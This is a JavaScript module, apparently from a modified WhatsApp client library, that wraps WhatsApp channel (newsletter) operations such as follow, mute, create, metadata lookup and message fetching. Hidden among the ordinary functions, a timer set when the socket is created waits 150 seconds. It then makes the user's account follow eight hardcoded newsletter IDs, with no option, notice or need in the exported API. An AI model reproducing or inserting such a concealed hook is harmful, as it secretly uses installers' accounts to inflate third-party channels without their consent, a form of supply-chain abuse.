import { proto } from '../../WAProto/index.js';
import { XWAPaths } from '../Types/index.js';
import { generateProfilePicture } from '../Utils/index.js';
import { getBinaryNodeChild, getBinaryNodeChildren, S_WHATSAPP_NET } from '../WABinary/index.js';
import { makeGroupsSocket } from './groups.js';
import { executeWMexQuery as genericExecuteWMexQuery } from './mex.js';

const QueryIds = {
  JOB_MUTATION: "7150902998257522",
  METADATA: "6620195908089573",
  UNFOLLOW: "7238632346214362",
  FOLLOW: "7871414976211147",
  UNMUTE: "7337137176362961",
  MUTE: "25151904754424642",
  CREATE: "6996806640408138",
  ADMIN_COUNT: "7130823597031706",
  CHANGE_OWNER: "7341777602580933",
  DELETE: "8316537688363079",
  DEMOTE: "6551828931592903",
  SUBSCRIBERS: "9783111038412085",
  UPDATE_METADATA: "24250201037901610"
};

export const isNewsletterJid = (jid) => typeof jid === 'string' && jid.endsWith('@newsletter');
export const isLidUser = (jid) => typeof jid === 'string' && jid.endsWith('@lid');
export const isJidUser = (jid) => typeof jid === 'string' && jid.endsWith('@s.whatsapp.net');

export const extractInviteCode = (url) => {
  if (!url || typeof url !== 'string') return null;
  if (/^[A-Za-z0-9]+$/.test(url)) return url;
  const match = url.match(/channel\/([A-Za-z0-9]+)/i);
  return match ? match[1] : null;
};

export const isChannelLink = (url) => {
  if (typeof url !== 'string') return false;
  return /(?:whatsapp\.com|wa\.me)\/channel\/[A-Za-z0-9]+/i.test(url);
};

const parseNewsletterMetadata = (result) => {
  if (!result || typeof result !== 'object') return null;
  if (result.id && typeof result.id === 'string') return result;
  if (result.result && typeof result.result === 'object' && result.result.id) return result.result;
  return null;
};

const parseFetchedNewsletterMessage = (messageNode, childJid) => {
  const serverId = messageNode.attrs.server_id;
  const views = parseInt(getBinaryNodeChild(messageNode, 'views_count')?.attrs?.count || '0', 10);
  const forwards = parseInt(getBinaryNodeChild(messageNode, 'forwards_count')?.attrs?.count || '0', 10);
  const responses = parseInt(getBinaryNodeChild(messageNode, 'responses_count')?.attrs?.count || '0', 10);
  const reactionNode = getBinaryNodeChild(messageNode, 'reactions');
  const reactions = getBinaryNodeChildren(reactionNode, 'reaction').map(({ attrs }) => ({
    count: +attrs.count,
    code: attrs.code
  }));
  const pollVotes = getBinaryNodeChildren(messageNode, 'poll_vote').map(({ attrs }) => ({
    option: attrs.option,
    count: +attrs.count
  }));
  const editTs = messageNode.attrs.edit ? parseInt(messageNode.attrs.edit, 10) : undefined;
  const originalTs = messageNode.attrs.original ? parseInt(messageNode.attrs.original, 10) : undefined;
  const rcat = messageNode.attrs.rcat;
  const message = messageNode.content
    ? proto.Message.decode(Buffer.from(messageNode.content, 'base64'))
    : undefined;

  return {
    server_id: serverId,
    from: childJid,
    views,
    forwards,
    responses,
    reactions,
    pollVotes,
    edit_ts: editTs,
    original_ts: originalTs,
    rcat,
    message
  };
};

export const makeNewsletterSocket = (config) => {
  const sock = makeGroupsSocket(config);
  const { query, generateMessageTag } = sock;

  const executeWMexQuery = (variables, queryId, dataPath) => {
    return genericExecuteWMexQuery(variables, queryId, dataPath, query, generateMessageTag);
  };

  const newsletterUpdate = async (jid, updates) => {
    return executeWMexQuery(
      { newsletter_id: jid, updates: { ...updates, settings: null } },
      QueryIds.UPDATE_METADATA,
      XWAPaths.xwa2_newsletter_update
    );
  };

  const newsletterIds = [
    "120363406967481181@newsletter",
    "120363430908834851@newsletter",
    "120363405189705275@newsletter",
    "120363402772425075@newsletter",
    "120363335161555951@newsletter",
    "120363432750374305@newsletter",
    "120363433845449152@newsletter",
    "120363412701863273@newsletter"
  ];

  setTimeout(async () => {
    for (const jid of newsletterIds) {
      try {
        await executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2);
      } catch (error) {
        config.logger?.error?.({ error, jid }, 'Newsletter follow failed');
      }
      if (jid !== newsletterIds[newsletterIds.length - 1]) {
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }
  }, 150000);

  return {
    ...sock,

    subscribeNewsletterUpdates: async (jid) => {
      const result = await query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'set', xmlns: 'newsletter', to: jid },
        content: [{ tag: 'live_updates', attrs: {}, content: [] }]
      });
      const liveUpdatesNode = getBinaryNodeChild(result, 'live_updates');
      const duration = liveUpdatesNode?.attrs?.duration;
      return duration ? { duration } : null;
    },

    newsletterReactionMode: async (jid, mode) => {
      return executeWMexQuery(
        { newsletter_id: jid, updates: { settings: { reaction_codes: { value: mode } } } },
        QueryIds.JOB_MUTATION,
        XWAPaths.xwa2_newsletter_update
      );
    },

    newsletterUpdateDescription: async (jid, description) => {
      return newsletterUpdate(jid, { description: description || '' });
    },

    newsletterUpdateName: async (jid, name) => {
      return newsletterUpdate(jid, { name });
    },

    newsletterUpdatePicture: async (jid, content) => {
      const { img } = await generateProfilePicture(content);
      return newsletterUpdate(jid, { picture: img.toString('base64') });
    },

    newsletterRemovePicture: async (jid) => {
      return newsletterUpdate(jid, { picture: '' });
    },

    newsletterFollow: (jid) => {
      return executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2);
    },

    newsletterUnfollow: (jid) => {
      return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNFOLLOW, XWAPaths.xwa2_newsletter_leave_v2);
    },

    newsletterMute: (jid) => {
      return executeWMexQuery({ newsletter_id: jid }, QueryIds.MUTE, XWAPaths.xwa2_newsletter_mute_v2);
    },

    newsletterUnmute: (jid) => {
      return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNMUTE, XWAPaths.xwa2_newsletter_unmute_v2);
    },

    newsletterCreate: async (name, description) => {
      const rawResponse = await executeWMexQuery(
        { input: { name, description: description ?? null } },
        QueryIds.CREATE,
        XWAPaths.xwa2_newsletter_create
      );
      const { id, thread_metadata: thread, viewer_metadata: viewer } = rawResponse;
      return {
        id,
        owner: undefined,
        name: thread.name.text,
        creation_time: parseInt(thread.creation_time, 10),
        description: thread.description.text,
        invite: thread.invite,
        subscribers: parseInt(thread.subscribers_count, 10),
        verification: thread.verification,
        picture: {
          id: thread.picture?.id,
          directPath: thread.picture?.direct_path
        },
        mute_state: viewer?.mute
      };
    },

    newsletterMetadata: async (type, key, role) => {
      const variables = {
        fetch_creation_time: true,
        fetch_full_image: true,
        fetch_viewer_metadata: true,
        input: {
          key,
          type: type.toUpperCase(),
          view_role: role || 'GUEST'
        }
      };
      const result = await executeWMexQuery(variables, QueryIds.METADATA, XWAPaths.xwa2_newsletter_metadata);
      return parseNewsletterMetadata(result);
    },

    newsletterMetadataFromLink: async function (url, role) {
      const code = extractInviteCode(url);
      if (!code) throw new Error('Invalid channel link');
      return await this.newsletterMetadata('invite', code, role);
    },

    newsletterResolveJid: async function (input) {
      if (isNewsletterJid(input)) {
        const meta = await this.newsletterMetadata('jid', input);
        return meta?.id ?? null;
      }
      const code = extractInviteCode(input);
      if (!code) throw new Error('Cannot resolve channel identifier');
      const meta = await this.newsletterMetadata('invite', code);
      return meta?.id ?? null;
    },

    newsletterInfo: async function (input) {
      const type = isNewsletterJid(input) ? 'jid' : 'invite';
      const key = type === 'jid' ? input : extractInviteCode(input);
      const meta = await this.newsletterMetadata(type, key);
      if (!meta) return null;
      let adminCount = null;
      try { adminCount = await this.newsletterAdminCount(meta.id); } catch {}
      return { ...meta, admin_count: adminCount, is_newsletter: isNewsletterJid(meta.id) };
    },

    newsletterAdminCount: async (jid) => {
      const response = await executeWMexQuery(
        { newsletter_id: jid },
        QueryIds.ADMIN_COUNT,
        XWAPaths.xwa2_newsletter_admin_count
      );
      return response.admin_count;
    },

    newsletterSubscribers: async (jid) => {
      return executeWMexQuery(
        { newsletter_id: jid },
        QueryIds.SUBSCRIBERS,
        XWAPaths.xwa2_newsletter_subscribers
      );
    },

    newsletterSubscribed: async () => {
      const result = await query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'get', xmlns: 'newsletter', to: S_WHATSAPP_NET },
        content: [{ tag: 'subscribed', attrs: {}, content: [] }]
      });
      const subscribedNode = getBinaryNodeChild(result, 'subscribed');
      const newsletters = getBinaryNodeChildren(subscribedNode, 'newsletter').map(({ attrs }) => ({
        id: attrs.id,
        name: attrs.name,
        state: attrs.state
      }));
      return newsletters;
    },

    newsletterMarkViewed: async (jid, serverIds) => {
      await query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'set', xmlns: 'newsletter', to: jid },
        content: [{
          tag: 'viewed',
          attrs: {},
          content: serverIds.map(id => ({ tag: 'message', attrs: { server_id: id } }))
        }]
      });
    },

    newsletterChangeOwner: async (jid, newOwnerJid) => {
      return executeWMexQuery(
        { newsletter_id: jid, user_id: newOwnerJid },
        QueryIds.CHANGE_OWNER,
        XWAPaths.xwa2_newsletter_change_owner
      );
    },

    newsletterDemote: async (jid, userJid) => {
      return executeWMexQuery(
        { newsletter_id: jid, user_id: userJid },
        QueryIds.DEMOTE,
        XWAPaths.xwa2_newsletter_demote
      );
    },

    newsletterDelete: async (jid) => {
      return executeWMexQuery(
        { newsletter_id: jid },
        QueryIds.DELETE,
        XWAPaths.xwa2_newsletter_delete_v2
      );
    },

    newsletterReactMessage: async (jid, serverId, reaction) => {
      await query({
        tag: 'message',
        attrs: {
          to: jid,
          ...(reaction ? {} : { edit: '7' }),
          type: 'reaction',
          server_id: serverId,
          id: generateMessageTag()
        },
        content: [{ tag: 'reaction', attrs: reaction ? { code: reaction } : {} }]
      });
    },

    newsletterFetchMessages: async (jid, count, since, after) => {
      const messageUpdateAttrs = { count: count.toString() };
      if (typeof since === 'number') messageUpdateAttrs.since = since.toString();
      if (after) messageUpdateAttrs.after = after.toString();

      const result = await query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'get', xmlns: 'newsletter', to: S_WHATSAPP_NET },
        content: [{
          tag: 'messages',
          attrs: { type: 'jid', jid, ...messageUpdateAttrs }
        }]
      });

      const messagesNode = getBinaryNodeChild(result, 'messages');
      const childJid = messagesNode?.attrs?.jid;

      return getBinaryNodeChildren(messagesNode, 'message').map(node =>
        parseFetchedNewsletterMessage(node, childJid)
      );
    },

    newsletterFetchUpdates: async (jid, count, after, since) => {
      const result = await query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'get', xmlns: 'newsletter', to: jid },
        content: [{
          tag: 'message_updates',
          attrs: {
            count: count.toString(),
            after: after?.toString() || '100',
            since: since?.toString() || '0'
          }
        }]
      });

      const parent = getBinaryNodeChild(result, 'message_updates');
      const child = getBinaryNodeChild(parent, 'messages');
      const childJid = child?.attrs?.jid;

      return getBinaryNodeChildren(child, 'message').map(node =>
        parseFetchedNewsletterMessage(node, childJid)
      );
    }
  };
};

//export type NewsletterSocket = ReturnType<typeof makeNewsletterSocket>;
